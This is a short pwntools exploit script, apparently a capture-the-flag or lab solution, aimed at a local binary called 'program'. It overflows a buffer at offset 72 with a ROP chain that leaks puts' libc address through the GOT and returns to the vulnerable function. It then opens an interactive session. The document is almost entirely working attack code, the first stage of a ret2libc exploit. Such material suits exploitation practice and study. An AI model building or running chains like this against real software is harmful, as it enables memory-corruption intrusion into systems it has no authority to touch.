from pwn import *
from pprint import pprint

context.arch = 'amd64'

elf = ELF('./program')
offset = 72
p = elf.process()
#pprint(elf.symbols)
rop = ROP(elf)
rop.call(elf.symbols['puts'],elf.got['puts'])
rop.call(elf.symbols['vuln'])
print(rop)
print(p.recvuntil("\n"))
print(p.recvuntil("\n"))
# payload = [
#     b"A"*72,
#     p64(elf.symbols['vuln'])
# ]
payload = [
    b"A"*72,
    rop.chain()
]

payload = b"".join(payload)
p.sendline(payload)

puts = u64(p.recvuntil('\n').rstrip().ljust(8,b'\x00'))
log.info(f'puts found at hex{puts}')

p.interactive()